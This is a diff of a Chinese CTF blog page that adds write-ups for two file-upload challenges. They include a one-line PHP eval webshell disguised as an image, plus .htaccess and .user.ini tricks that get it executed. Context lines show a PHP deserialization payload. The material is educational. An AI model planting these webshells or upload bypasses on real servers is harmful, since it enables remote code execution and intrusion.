@@ -100,12 +100,12 @@ youlin = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeu7txpzj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicm0fdw5cj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclflwv2aj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipew8gmvyj20zk0m87wh.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeuv80yoj20zk0m8kjl.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexe4oykj20zk0m87ji.jpg"></li>
         </ul>
       </div>
     </header>
@@ -219,6 +219,23 @@ youlin = Hexo</title>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>flag:flag{cda1d469-1b5b-43aa-9cf2-28d1b99c5b20}</p>
+<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>一个很特别的文件上传界面</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126202516147.png" alt="image-20221126202516147"></p>
+<p>只可以上传图片，php,phtml等后缀都被过滤了，首先上传一个图片马1.png</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接着上传一个**.htaccess**文件</p>
+<p>.htaccess是什么</p>
+<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p>
+<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
+<p>那么现在开始写一个.htaccess文件，里面的内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意里面的1.png要和你刚才上传的文件名一样，接着上传，需要使用bp进行绕过</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126202859568.png" alt="image-20221126202859568"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126203225566.png" alt="image-20221126203225566"></p>
+<p>显示上传成功后就可以直接使用蚁剑链接了，flag在根目录</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126204523224.png" alt="image-20221126204523224"></p>
 <h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>和之前几个sql注入题一样的界面，先用bp fuzz测试一下过滤了哪些词</p>
 <p>参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9hNzhhMzIzMmZmYjM=">利用burpsuit对xss和sql注入进行fuzz</span>（主要就是利用bp的intruder模块进行爆破，看长进行判断，响应为736都被过滤，响应为751的没有被过滤）</p>
 <p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125225257899.png" alt="image-20221125225257899"></p>
@@ -255,6 +272,15 @@ youlin = Hexo</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_numeric — 检测变量是否为数字或数字字符串，如果 是数字和数字字符串则返回 TRUE，否则返回 FALSE。</span><br></pre></td></tr></table></figure>
 
 <p>用1234567a使得返回false，直接得到flag</p>
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>一个文件上传，也是将php,phtml等后缀过滤了，首先上传一个图片马，shell.jpg</p>
+<p>接着上传一个 <strong>.user.ini</strong> 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># .xxxx.ini　文件是配置当前目录以及当前子目录的规则配置的文件，文件的中的配置会覆盖掉当前php.ini中的规则，是当前用户的配置文件</span><br><span class="line"># 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[&#x27;DOCUMENT_ROOT&#x27;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</span><br><span class="line"></span><br><span class="line"># 如果是 Apache 服务器，则可以利用 .htaccess 文件，作用和 .INI 一样，只是风格上有些不一样</span><br></pre></td></tr></table></figure>
+
+<p>接着蚁剑直接链接，flag在根目录</p>
 
   </div>
 
@@ -266,7 +292,7 @@ youlin = Hexo</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2022-11-25 23:10:38" itemprop="dateModified" datetime="2022-11-25T23:10:38+08:00">2022-11-25</time>
+    <time title="Modified: 2022-11-26 20:52:07" itemprop="dateModified" datetime="2022-11-26T20:52:07+08:00">2022-11-26</time>
   </span>
 </div>
 
@@ -321,7 +347,7 @@ youlin = Hexo</title>
     <div class="item left">
       
 
-  <a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeyonbf9j20zk0m8e81.jpg" title="祥云杯复现">
+  <a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4baakhj20zk0m8h5q.jpg" title="祥云杯复现">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>祥云杯复现</h3>
@@ -331,7 +357,7 @@ youlin = Hexo</title>
     <div class="item right">
       
 
-  <a href="/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexoj0moj20zk0m8kgu.jpg" title="sql注入总结">
+  <a href="/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhnx9glj20zk0m8npd.jpg" title="sql注入总结">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>sql注入总结</h3>
@@ -353,7 +379,7 @@ youlin = Hexo</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">1.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">3.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-number">4.</span> <span class="toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-number">5.</span> <span class="toc-text">[MRCTF2020]Ez_bypass</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">1.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">3.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-number">4.</span> <span class="toc-text">[MRCTF2020]你传你🐎呢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-number">5.</span> <span class="toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-number">6.</span> <span class="toc-text">[MRCTF2020]Ez_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -426,63 +452,6 @@ youlin = Hexo</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
-
-    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/" title="格式化字符串泄露canary">格式化字符串泄露canary</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="堆利用总结">堆利用总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
-
-    <span><a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="巅峰极客复现">巅峰极客复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
-
-    <span><a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" title="DASCTF_X_CBCTF_2022九月挑战赛">DASCTF_X_CBCTF_2022九月挑战赛</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="祥云杯复现">祥云杯复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 </div>
 
     <span><a href="/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">栈迁移</a></span>
@@ -494,7 +463,16 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/04/0ctf-2017-babyheap/" title="0ctf_2017_babyheap">0ctf_2017_babyheap</a></span>
+    <span><a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="堆利用总结">堆利用总结</a></span>
   </li>
 
       
@@ -512,7 +490,53 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/10/16/docker/" title="docker">docker</a></span>
+    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/11/house-of-emma/" title="house_of_emma">house_of_emma</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/cometition/" title="In cometition">cometition</a>
+</div>
+
+    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/" title="利用_IO_2_1_stdout泄露libc">利用_IO_2_1_stdout泄露libc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/22/house-of-banana/" title="house_of_banana">house_of_banana</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/11/19/buu-web/" title="buu_web（21-xx)">buu_web（21-xx)</a></span>
   </li>
 
   </ul>
